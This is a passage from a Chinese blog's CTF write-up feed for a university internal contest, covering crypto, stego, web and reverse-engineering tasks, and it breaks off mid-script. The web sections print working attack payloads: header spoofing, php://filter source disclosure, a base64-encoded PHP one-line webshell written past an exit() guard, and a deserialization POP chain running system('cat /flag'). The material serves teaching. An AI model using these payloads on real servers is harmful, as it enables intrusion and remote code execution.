class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> Crypto.Util.number <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">import</span> random</span><br><span class="line">n = <span class="number">43241</span></span><br><span class="line">m = random.randint(<span class="number">2</span>, n<span class="number">-1</span>) | <span class="number">1</span></span><br><span class="line">c = pow(m, flag, n)</span><br><span class="line"><span class="keyword">print</span> <span class="string">'m = '</span> + str(m)</span><br><span class="line"><span class="keyword">print</span> <span class="string">'c = '</span> + str(c)</span><br><span class="line"><span class="comment"># m = 7</span></span><br><span class="line"><span class="comment"># c = 35246</span></span><br></pre></td></tr></table></figure><p>把网鼎杯的数据改小了，用在线网站工具<a href="https://www.alpertron.com.ar/DILOG.HTM" target="_blank" rel="noopener">离散对数计算器</a>即可求解</p><p><img src="https://img-blog.csdnimg.cn/20200719170641702.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dlaXhpbl80NTg4MzIyMw==,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"><br>把3373md5加密即可</p><h2 id="MISC"><a href="#MISC" class="headerlink" title="MISC"></a>MISC</h2><h3 id="0x00-sounds"><a href="#0x00-sounds" class="headerlink" title="0x00 . sounds"></a>0x00 . sounds</h3><p>​        根据题目，猜出是个音频文件，改成.mp3后缀听一下，没啥信息。</p><p>​        丢进Audiecy：</p><p><img src="https://s1.ax1x.com/2020/07/20/U4wqO0.png" alt=""></p><p>​        查看频谱图：</p><p><img src="https://s1.ax1x.com/2020/07/20/U4wXwT.png" alt=""></p><p>​        得到flag。</p><h3 id="佬涩披"><a href="#佬涩披" class="headerlink" title="佬涩披"></a>佬涩披</h3><p>stegsolve方向键点几下就有了</p>]]></content>
      
      
      <categories>
          
          <category> CTF </category>
          
      </categories>
      
      
        <tags>
            
            <tag> CTF </tag>
            
            <tag> Web </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>WUST内部赛wp</title>
      <link href="2021/01/30/s1rone_wp/"/>
      <url>2021/01/30/s1rone_wp/</url>
      
        <content type="html"><![CDATA[<p>2019-2020-2-WUST第一次内部赛 Writeup</p><a id="more"></a><h2 id="Web"><a href="#Web" class="headerlink" title="Web"></a>Web</h2><h3 id="0x00-签到题"><a href="#0x00-签到题" class="headerlink" title="0x00 . 签到题"></a>0x00 . 签到题</h3><p>知识点：</p><p><strong>了解HTTP头部各部分的含义：</strong></p><p><strong>GET传参方式</strong></p><p><strong>POST传参方式</strong></p><p><strong>Referer伪造</strong></p><p><strong>IP伪造（XFF和Client-IP）</strong></p><p>下方是代码逻辑：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">header(&#39;Content-type:text&#x2F;html;charset&#x3D;utf-8&#39;);</span><br><span class="line">if(isset($_GET[&#39;ais&#39;]))&#123;</span><br><span class="line">if($_GET[&#39;ais&#39;] &#x3D;&#x3D; 123)&#123;</span><br><span class="line">if(isset($_POST[&#39;ais&#39;]))&#123;</span><br><span class="line">if ($_POST[&#39;ais&#39;] &#x3D;&#x3D; 123) &#123;</span><br><span class="line">if(isset($_SERVER[&quot;HTTP_REFERER&quot;]))&#123;</span><br><span class="line">if($_SERVER[&quot;HTTP_REFERER&quot;]&#x3D;&#x3D;&quot;https:&#x2F;&#x2F;www.baidu.com&quot;)&#123;</span><br><span class="line">if(isset($_SERVER[&#39;HTTP_X_FORWARDED_FOR&#39;])||isset($_SERVER[&#39;HTTP_CLIENT_IP&#39;]))&#123;</span><br><span class="line">if(isset($_SERVER[&#39;HTTP_X_FORWARDED_FOR&#39;])&amp;&amp;$_SERVER[&#39;HTTP_X_FORWARDED_FOR&#39;]&#x3D;&#x3D;&quot;127.0.0.1&quot;)&#123;</span><br><span class="line">die(&quot;你想干嘛！！！从本地访问，你伪造干嘛！！当真我不知道x-forwarded-for嘛！！！&quot;);</span><br><span class="line">&#125;elseif($_SERVER[&#39;HTTP_CLIENT_IP&#39;]&#x3D;&#x3D;&quot;127.0.0.1&quot;)&#123;</span><br><span class="line">echo &quot;Oh my god....被你发现了！！&quot;;</span><br><span class="line">system(&#39;cat &#x2F;flag&#39;);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">&#125;else&#123;</span><br><span class="line">die(&quot;你需要从本地来访问我哦！！！&quot;);</span><br><span class="line">&#125;</span><br><span class="line">&#125;else&#123;</span><br><span class="line">die(&quot;很接近了，但你从哪访问的我呀！！只有通过https:&#x2F;&#x2F;www.baidu.com才能访问我呀！！&quot;);</span><br><span class="line">&#125;</span><br><span class="line">&#125;else&#123;</span><br><span class="line">die(&quot;你需要从百度页面来访问我！！！！&quot;);</span><br><span class="line">&#125;</span><br><span class="line">&#125;else&#123;</span><br><span class="line">die(&quot;很接近了，很快就能拿到flag了！&quot;);</span><br><span class="line">&#125;</span><br><span class="line">&#125;else&#123;</span><br><span class="line">die(&quot;用POST传一个名为ais的参数，令它的值等于123&quot;);</span><br><span class="line">&#125;</span><br><span class="line">&#125;else&#123;</span><br><span class="line">die(&quot;很接近了，很快就能拿到flag了！&quot;);</span><br><span class="line">&#125;</span><br><span class="line">&#125;else&#123;</span><br><span class="line">die(&quot;用GET传一个名为ais的参数，令它的值等于123&quot;);</span><br><span class="line">&#125;</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure><p>Burpsuit抓包：发送到Repeater</p><img src="https://s1.ax1x.com/2020/05/02/JvsEz8.png" /><p>更换请求方式：</p><p>1、GET方式传参</p><img src="https://s1.ax1x.com/2020/05/02/Jvrf2T.png" /><p>2、POST方式传参</p><img src="https://s1.ax1x.com/2020/05/02/Jvr5MF.png"/><p>3、伪造Referer和IP</p><img src="https://s1.ax1x.com/2020/05/02/JvrIr4.png" /><p>（这里ban掉了XFF）</p><h3 id="0x01-PHP是世界上最好的语言"><a href="#0x01-PHP是世界上最好的语言" class="headerlink" title="0x01 . PHP是世界上最好的语言"></a>0x01 . PHP是世界上最好的语言</h3><p>知识点：</p><p><strong>服务器解析页面顺序</strong></p><p><strong>文件包含（php伪协议读取源码）</strong></p><p><strong>学习一下一句话木马及其原理</strong></p><p><strong>简单的代码审计（传马绕过死亡exit）</strong></p><p>apache下的配置文件httpd.conf，一般默认的是html，然后php</p><p><img src="https://s1.ax1x.com/2020/05/02/JvrhxU.png" alt="JvrhxU.png"></p><p>根目录放了两个文件<img src="https://s1.ax1x.com/2020/05/02/JvrWGV.png" alt="JvrWGV.png"></p><p>所有会先是先是index.html</p><p>所以这里直接访问index.php</p><p>在index.php里面放了两个提示：（随便一个都可以往下走）</p><p>1、F12审计，有个URL:?file= </p><p>2、抓包，在HTTP响应头部有个hint，base64解码得到：file include: /?file</p><p>所以，这里考察的是文件包含（页面使用的是PHP语言）</p><p>用到PHP伪协议读取源码：</p><p><a href="https://imgchr.com/i/JvroqJ" target="_blank" rel="noopener"><img src="https://s1.ax1x.com/2020/05/02/JvroqJ.png" alt="JvroqJ.png"></a></p><p>得到index.php经过base64后的源代码：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br></pre></td><td class="code"><pre><span class="line">&lt;!DOCTYPE html&gt;</span><br><span class="line">&lt;html&gt;</span><br><span class="line">&lt;meta http-equiv&#x3D;&quot;Content-Type&quot; content&#x3D;&quot;text&#x2F;html; charset&#x3D;utf-8&quot;&gt;</span><br><span class="line">&lt;head&gt;</span><br><span class="line">&lt;title&gt;å¦å¦å¦ï¼ä½ å¨è¿&lt;&#x2F;title&gt;</span><br><span class="line">&lt;style&gt;</span><br><span class="line">div&#123;</span><br><span class="line">float: left;</span><br><span class="line">&#125;</span><br><span class="line">&lt;&#x2F;style&gt;</span><br><span class="line">&lt;&#x2F;head&gt;</span><br><span class="line">&lt;body&gt;</span><br><span class="line">&lt;!--</span><br><span class="line"></span><br><span class="line">URL:&#x2F;?file&#x3D;</span><br><span class="line"></span><br><span class="line">--&gt;</span><br><span class="line"></span><br><span class="line">&lt;div id&#x3D;&#39;left&#39;&gt;&lt;img src&#x3D;&quot;bg.jpg&quot; height&#x3D;&quot;70%&quot; width&#x3D;&quot;70%&quot;&gt;&lt;&#x2F;div&gt;</span><br><span class="line">&lt;div id&#x3D;&#39;right&#39;&gt;</span><br><span class="line">&lt;h1&gt;&lt;&#x2F;h1&gt;</span><br><span class="line">&lt;h2&gt;&lt;&#x2F;h2&gt;</span><br><span class="line">&lt;&#x2F;div&gt;</span><br><span class="line">&lt;?php &#x2F;&#x2F;look:  upload.php</span><br><span class="line">header(&#39;hint: ZmlsZSBpbmNsdWRlOiAvP2ZpbGU&#x3D;&#39;);</span><br><span class="line">    $file &#x3D; @$_GET[&#39;file&#39;];</span><br><span class="line">    if(isset($file))&#123;</span><br><span class="line">    include($file);</span><br><span class="line">     &#125;</span><br><span class="line">     ?&gt;</span><br><span class="line">&lt;&#x2F;body&gt;</span><br><span class="line">&lt;&#x2F;html&gt;</span><br></pre></td></tr></table></figure><p>有个upload.php,通过同样的方法读取源码</p><p><a href="https://imgchr.com/i/Jvr7Z9" target="_blank" rel="noopener"><img src="https://s1.ax1x.com/2020/05/02/Jvr7Z9.png" alt="Jvr7Z9.png"></a></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">$exit&#x3D;&quot;&lt;?php exit; &#x2F;&#x2F;I just want you to understand the principle ?&gt;&quot;;</span><br><span class="line">@$exit.&#x3D;$_POST[&#39;death&#39;];</span><br><span class="line"></span><br><span class="line">@$filename &#x3D; $_POST[&#39;filename&#39;];</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">if(!isset($filename))&#123;</span><br><span class="line">   @file_put_contents($filename, &quot;you should set something&quot;);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">else&#123;</span><br><span class="line">   @file_put_contents($filename,$exit);</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure><p>这里是一个简单的代码审计：</p><p>可以上传任意文件，并且可以往文件里面写任何东西，但存在一个限制（在每个文件头都加上了exit），这导致传入的可执行马不能运行，所以这里要绕过exit，让它不生效</p><p>（这里还是使用PHP伪协议，向文件写入代码）</p><p>可以参考一下P牛的这篇文章：（了解一下base64的原理）</p><p><a href="https://www.leavesongs.com/PENETRATION/php-filter-magic.html" target="_blank" rel="noopener">https://www.leavesongs.com/PENETRATION/php-filter-magic.html</a></p><p>由于前面用了//注释了一些东西，要base64正确解码，就必须在payload前面多给3个字符，让他与前面的字符串组成的长度是4的倍数，然后后面传payload</p><p>payload:</p><p>death=aaaPD9waHAKZXZhbCgkX1BPU1RbJ3NoZWxsJ10pOwo/Pg==&amp;filename=php://filter/write=convert.base64-decode/resource=xxxxxx.php</p><p>这样传入的一句话木马就可以生效了，用蚁剑连上去，在服务器根目录发现flag</p><p><img src="https://s1.ax1x.com/2020/05/02/JvrHaR.png" alt="JvrHaR.png"></p><h3 id="0x02-你喜欢甜饼吗"><a href="#0x02-你喜欢甜饼吗" class="headerlink" title="0x02 . 你喜欢甜饼吗"></a>0x02 . 你喜欢甜饼吗</h3><p>知识点：</p><p><strong>逻辑漏洞（薅羊毛）</strong></p><p><strong>反序列化（魔术方法的利用）</strong></p><p>1、通过伪造Cookie拿到hint</p><p>抓包查看cookie，有个tag参数，base64解码一下：</p><p><a href="https://imgchr.com/i/JvrOG6" target="_blank" rel="noopener"><img src="https://s1.ax1x.com/2020/05/02/JvrOG6.png" alt="JvrOG6.png"></a></p><p>得到：user:guest,permission:false</p><p>页面提示是要admin才能访问，将guest改为admin，base64后传进去，发现页面提示没有权限，所以这里再改一下permission，改为true</p><p>user:admin,permission:true</p><p>base64一下覆盖tag后面的一串，拿到hint</p><p><a href="https://imgchr.com/i/JvrbI1" target="_blank" rel="noopener"><img src="https://s1.ax1x.com/2020/05/02/JvrbI1.png" alt="JvrbI1.png"></a></p><p>访问这个网站：然后F12看到这个提示：</p><p><img src="https://s1.ax1x.com/2020/05/02/JvrLPx.png" alt="JvrLPx.png"></p><p>直接访问这个zip，下载得到源码：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">&#x2F;*</span><br><span class="line">你居然找到了源码</span><br><span class="line"></span><br><span class="line">惊不惊喜，意不意外</span><br><span class="line"></span><br><span class="line">hint: flag在&#x2F;flag</span><br><span class="line"></span><br><span class="line">留下你的姓名。。。。。。。。。。。。。。。。。。。。。。。。。。。。。</span><br><span class="line">*&#x2F;</span><br><span class="line">header(&quot;Content-Type: text&#x2F;html; charset&#x3D;utf-8&quot;);</span><br><span class="line"></span><br><span class="line">class Sea&#123;</span><br><span class="line">   public $d0y0uw4nt;</span><br><span class="line"></span><br><span class="line">   function waoooo()&#123;</span><br><span class="line">         echo &quot;&lt;h1&gt;你是否有过黑客梦！！！！！！！！&lt;&#x2F;h1&gt;&lt;br&#x2F;&gt;&quot;;</span><br><span class="line">         echo $this;</span><br><span class="line">         echo $this-&gt;d0y0uw4nt;</span><br><span class="line">   &#125;</span><br><span class="line"></span><br><span class="line">   function __construct($shell)&#123;</span><br><span class="line">         $this-&gt;d0y0uw4nt &#x3D; $shell;</span><br><span class="line">            &#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">   public function __toString()&#123;</span><br><span class="line">         unserialize($this-&gt;d0y0uw4nt);</span><br><span class="line">         return &quot;&lt;h2&gt;自闭的一天就要来了！！！！&lt;&#x2F;h2&gt;&quot;;</span><br><span class="line"></span><br><span class="line">   &#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">class Cry&#123;</span><br><span class="line">        public $C;</span><br><span class="line"></span><br><span class="line">        public $fl4g;</span><br><span class="line"></span><br><span class="line">        public function halo()&#123;</span><br><span class="line">                echo &quot;这么多代码，是不是不想看！！！！！！！！&quot;;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        public function y0u_hacker()&#123;</span><br><span class="line">                &#x2F;&#x2F;echo $this-&gt;fl4g;</span><br><span class="line">                eval($this-&gt;fl4g);</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        function __destruct()&#123;</span><br><span class="line">                &#x2F;&#x2F;echo &quot;Cry类死了！&quot;;</span><br><span class="line">                $this-&gt;C-&gt;s4y_l0v3();</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line">class Love&#123;</span><br><span class="line">        public $B;</span><br><span class="line"></span><br><span class="line">        public function sea_said()&#123;</span><br><span class="line">                echo &quot;愿你一生努力，一生被爱！！&quot;;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        public function y0u_love()&#123;</span><br><span class="line">                echo &quot;想要的都拥有，得不到的都释怀！！&quot;;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        &#x2F;&#x2F;s4y_l0v3明天再写</span><br><span class="line"></span><br><span class="line">        function __call($method,$value)&#123; &#x2F;&#x2F;最终的利用方式</span><br><span class="line">                $this-&gt;B-&gt;y0u_hacker();</span><br><span class="line">        &#125;</span><br><span class="line">        function __destruct()&#123;</span><br><span class="line">                &#x2F;&#x2F;echo &quot;Love类死了！&quot;;</span><br><span class="line">        &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">@$wuhaha &#x3D; $_POST[&#39;l0v3&#39;];</span><br><span class="line">$Sea &#x3D; new Sea($wuhaha);</span><br><span class="line">$Sea-&gt;waoooo();</span><br></pre></td></tr></table></figure><p>这里考察了一下反序列化和魔术方法的利用：（简单POP链的构造）</p><p>找到Cry类中的y0u_hacker方法（因为存在eval函数），所以就从这里入手，看看能不能调用这个函数，并且fl4g参数可控；（大多安全问题都来源于输入与输出）</p><p>这里审计一下代码，发现Love类中的__call方法调用了y0u_hacker函数，那么就要想办法调用这个函数（关于__call方法，当该对象调用的方法不存在的时候，就调用这个方法）</p><p>所以这里找到Cry的__destruct析构函数，如果这里将C变为Love对象，那么就会调用Love对象的__call方法（因为Love对象没有s4y_l0v3这个函数）</p><p>那么到此，利用链就清楚了</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">class Cry&#123;</span><br><span class="line">        public $C;</span><br><span class="line">        public $fl4g;</span><br><span class="line">        public function halo()&#123;</span><br><span class="line">                echo &quot;这么多代码，是不是不想看！！！！！！！！&quot;;</span><br><span class="line">        &#125;</span><br><span class="line">        public function y0u_hacker()&#123;</span><br><span class="line">                &#x2F;&#x2F;echo $this-&gt;fl4g;</span><br><span class="line">                eval($this-&gt;fl4g);</span><br><span class="line">        &#125;</span><br><span class="line">        function __destruct()&#123;</span><br><span class="line">                &#x2F;&#x2F;echo &quot;Cry类死了！&quot;;</span><br><span class="line">                $this-&gt;C-&gt;s4y_l0v3();</span><br><span class="line">        &#125;</span><br><span class="line">&#125;</span><br><span class="line">class Love&#123;</span><br><span class="line">        public $B;</span><br><span class="line">        public function sea_said()&#123;</span><br><span class="line">                echo &quot;愿你一生努力，一生被爱！！&quot;;</span><br><span class="line">        &#125;</span><br><span class="line">        public function y0u_love()&#123;</span><br><span class="line">                echo &quot;想要的都拥有，得不到的都释怀！！&quot;;</span><br><span class="line">        &#125;</span><br><span class="line">        &#x2F;&#x2F;s4y_l0v3明天再写</span><br><span class="line">        function __call($method,$value)&#123; &#x2F;&#x2F;最终的利用方式</span><br><span class="line">                $this-&gt;B-&gt;y0u_hacker();</span><br><span class="line">        &#125;</span><br><span class="line">        function __destruct()&#123;</span><br><span class="line">                &#x2F;&#x2F;echo &quot;Love类死了！&quot;;</span><br><span class="line">        &#125;</span><br><span class="line">&#125;</span><br><span class="line">$Cry_1 &#x3D; new Cry();</span><br><span class="line">$Cry_2 &#x3D; new Cry(); &#x2F;&#x2F;Love类的B参数对象</span><br><span class="line">$Cry_2-&gt;fl4g &#x3D; &quot;system(&#39;cat &#x2F;flag&#39;);&quot;;</span><br><span class="line">&#x2F;&#x2F;通过Cry_1对象的析构，调用s4y_l0v3方法</span><br><span class="line">$Love_1 &#x3D; new Love();</span><br><span class="line">$Love_1-&gt;B &#x3D; $Cry_2;</span><br><span class="line">$Cry_1-&gt;C &#x3D; $Love_1;</span><br><span class="line">echo serialize($Cry_1);</span><br><span class="line"></span><br><span class="line">&#x2F;&#x2F;O:3:&quot;Cry&quot;:2:&#123;s:1:&quot;C&quot;;O:4:&quot;Love&quot;:1:&#123;s:1:&quot;B&quot;;O:3:&quot;Cry&quot;:2:&#123;s:1:&quot;C&quot;;N;s:4:&quot;fl4g&quot;;s:20:&quot;system(&#39;cat &#x2F;flag&#39;);&quot;;&#125;&#125;s:4:&quot;fl4g&quot;;N;&#125;</span><br></pre></td></tr></table></figure><p>生成payload,POST传参，得到flag</p><p><img src="https://s1.ax1x.com/2020/05/02/JvrjxO.png" alt="JvrjxO.png"></p><h2 id="RE"><a href="#RE" class="headerlink" title="RE"></a>RE</h2><h3 id="0x00-baby-re"><a href="#0x00-baby-re" class="headerlink" title="0x00.baby_re"></a>0x00.baby_re</h3><p>出题人：0bs3rver</p><p>这题旨在让大家了解最基本的逆向。</p><p>顾名思义，很简单的一道re题，根据题目提示用ida打开并按下F5，可以得到一段main代码。</p><p>观察代码逻辑可得，该程序让你输入flag，通过check函数进行比对，并根据check函数的返回值判断flag是否正确。而点进check函数，可以看到该函数把你的输入进行运算，然后再与flag数组进行比对，一旦错误则返回0。</p><p>点进flag数组会是一大段数值，这时我们就可以知道，需要将这段值提取出来，通过逆向算法来get flag。</p><p>其中有几个细节需要注意，比如flag为int数组，而int在内存中是占四个字节的，在ida里面db，dw，dd分别代表1、2、4个字节，一些同学点进flag数组可能会很懵逼，不知道这都是啥玩意，真正的数据是什么。</p><p><img src="https://space.0bs3rver.workers.dev/0bs3rver/Picture/master//blogimg/%E5%8D%8F%E4%BC%9A%E8%AE%AD%E7%BB%83%E8%B5%9B-1-1.png" alt=""></p><p>仔细观察可以发现只有第一个数据：350h前面的类型是dd，后面的都是db。</p><p>我们需要单击前面的类型，然后按下d，就可以方便的将类型转化为我们需要的dd，这样就能轻松的找到我们需要的信息。</p><p><img src="https://space.0bs3rver.workers.dev/0bs3rver/Picture/master//blogimg/%E5%8D%8F%E4%BC%9A%E8%AE%AD%E7%BB%83%E8%B5%9B-1-2.png" alt=""></p><p>算法逆向很简单，这里就不多赘述了。</p><p>唯一需要注意的可能是这个地方。</p><p><img src="https://space.0bs3rver.workers.dev/0bs3rver/Picture/master//blogimg/%E5%8D%8F%E4%BC%9A%E8%AE%AD%E7%BB%83%E8%B5%9B-1-3.png" alt=""></p><p>这行代码的原型是 a[i] = c1[i] &lt;&lt; 3; ，这里char* 表示的是后面这个地址指向的是一个char类型的字符串，前面再带一个<em>是因为我们需要的是这个地址里面的值而不是这个地址，再前面的\</em>则是乘法符号。</p><p>附上源代码及解题脚本</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">check</span> <span class="params">(<span class="keyword">char</span>* c)</span></span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">int</span> flag[<span class="number">40</span>] = &#123;<span class="number">848</span>,<span class="number">864</span>,<span class="number">776</span>,<span class="number">856</span>,<span class="number">1016</span>,<span class="number">688</span>,<span class="number">808</span>,<span class="number">792</span>,<span class="number">392</span>,<span class="number">424</span>,<span class="number">792</span>,<span class="number">696</span>,<span class="number">384</span>,<span class="number">920</span>,<span class="number">920</span>,<span class="number">920</span>,<span class="number">920</span>,<span class="number">920</span>,<span class="number">920</span>,<span class="number">920</span>,<span class="number">920</span>,<span class="number">920</span>,<span class="number">792</span>,<span class="number">696</span>,<span class="number">840</span>,<span class="number">872</span>,<span class="number">896</span>,<span class="number">864</span>,<span class="number">808</span>,<span class="number">1000</span>&#125;;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">(<span class="keyword">int</span> argc, <span class="keyword">const</span> <span class="keyword">char</span> * argv[])</span> </span>&#123;</span><br><span class="line">    <span class="keyword">char</span> c[<span class="number">40</span>] = <span class="string">"\0"</span>;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">"please input your flag:"</span>);</span><br><span class="line">    <span class="built_in">scanf</span>(<span class="string">"%s"</span>,c);</span><br><span class="line">    <span class="keyword">if</span>(check(c))</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">"Wow, your flag is right!\n"</span>);</span><br><span class="line">    <span class="keyword">else</span></span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">"Maybe you need to try again~\n"</span>);</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">check</span> <span class="params">(<span class="keyword">char</span>* c1)</span></span>&#123;</span><br><span class="line">    <span class="keyword">int</span> a[<span class="number">40</span>];</span><br><span class="line">    <span class="keyword">for</span>(<span class="keyword">int</span> i=<span class="number">0</span>; i&lt;<span class="number">30</span>; i++)&#123;</span><br><span class="line">            a[i] = c1[i] &lt;&lt; <span class="number">3</span>;</span><br><span class="line">            a[i] += <span class="number">0x10</span>;</span><br><span class="line">            a[i] ^= <span class="number">0x10</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    <span class="keyword">for</span>(<span class="keyword">int</span> i=<span class="number">0</span>; i&lt;<span class="number">30</span>; i++)&#123;</span><br><span class="line">        <span class="keyword">if</span>(flag[i] != a[i])</span><br><span class="line">            <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> <span class="number">1</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">num = [<span class="number">848</span>,<span class="number">864</span>,<span class="number">776</span>,<span class="number">856</span>,<span class="number">1016</span>,<span class="number">688</span>,<span 